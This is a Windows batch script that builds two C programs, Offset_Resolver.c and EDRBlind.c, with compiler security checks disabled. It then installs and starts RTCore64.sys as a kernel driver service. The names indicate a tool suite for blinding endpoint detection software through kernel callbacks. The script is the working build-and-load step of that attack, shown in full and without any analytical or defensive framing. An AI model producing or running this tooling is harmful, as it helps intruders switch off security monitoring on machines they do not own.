@echo off
call "C:\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
cd /d Z:\KernelCallbacks

:: ── RTCore64 suite ──────────────────────────────────────────────────────────
cl Offset_Resolver.c /O2 /GS- /sdl-
cl EDRBlind.c        /O2 /GS- /sdl-

del *.obj 2>nul
echo Build done.

echo.
echo [*] Loading RTCore64.sys...

sc stop   RTCore64 >nul 2>&1
sc delete RTCore64 >nul 2>&1

if not exist "%CD%\RTCore64.sys" (
    echo [-] RTCore64.sys not found in %CD%
    goto :eof
)

sc create RTCore64 type= kernel binpath= "%CD%\RTCore64.sys" >nul
sc start  RTCore64 >nul 2>&1
sc query  RTCore64 | findstr STATE
if errorlevel 1 (
    echo [-] Driver failed to start
) else (
    echo [+] RTCore64 loaded from %CD%\RTCore64.sys
)
